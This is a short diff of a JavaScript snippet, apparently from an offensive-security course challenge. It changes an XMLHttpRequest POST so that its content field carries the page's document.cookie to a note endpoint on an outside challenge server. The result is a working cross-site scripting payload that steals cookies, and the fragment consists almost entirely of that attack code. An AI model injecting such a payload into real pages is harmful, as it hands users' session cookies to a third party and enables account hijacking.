@@ -1,5 +1,5 @@
 var url = "http://offsec-chalbroker.osiris.cyber.nyu.edu:12345/note/new";
-var params = "title=abc1&content=abc2&submit=save";
+var params = "title=abc1&content=" + document.cookie + "&submit=save";
 var xhr = new XMLHttpRequest();
 xhr.open("POST", url, true);
 
